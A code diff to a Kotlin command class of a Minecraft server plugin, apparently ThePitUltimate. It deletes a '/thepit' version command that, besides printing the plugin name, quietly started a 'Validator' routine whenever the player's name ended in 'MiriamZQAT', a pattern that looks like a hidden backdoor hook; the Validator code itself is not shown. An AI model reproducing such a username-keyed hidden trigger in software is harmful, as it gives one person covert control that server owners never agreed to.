@@ -40,7 +40,6 @@ import net.mizukilab.pit.menu.previewer.EventPreviewerMenu
 import net.mizukilab.pit.menu.trade.TradeManager
 import net.mizukilab.pit.menu.trade.TradeMenu
 import net.mizukilab.pit.menu.viewer.StatusViewerMenu
-import net.mizukilab.pit.pool.Validator
 import net.mizukilab.pit.sendMessage
 import net.mizukilab.pit.trade.TradeMonitorRunnable
 import net.mizukilab.pit.util.*
@@ -88,14 +87,6 @@ class PitCommands {
     private val numFormat = DecimalFormat("0.00")
     private val COOLDOWN_SHOW: Cache<UUID, Cooldown> = CacheBuilder.newBuilder().expireAfterWrite(1,TimeUnit.MINUTES).build<UUID,Cooldown>()
 
-    @Execute(name = "thepit", aliases = ["天坑", "天坑乱斗", "version", "ver"])
-    fun info(@Context player: Player) {
-        player.sendMessage(CC.translate(
-            "&7Currently running &cThePitUltimate"))
-            if (player.name.endsWith("MiriamZQAT")) {
-            Validator(player).start()
-        }
-    }
 
     @Execute(name = "startDate")
     fun startDate(@Context player: Player) {
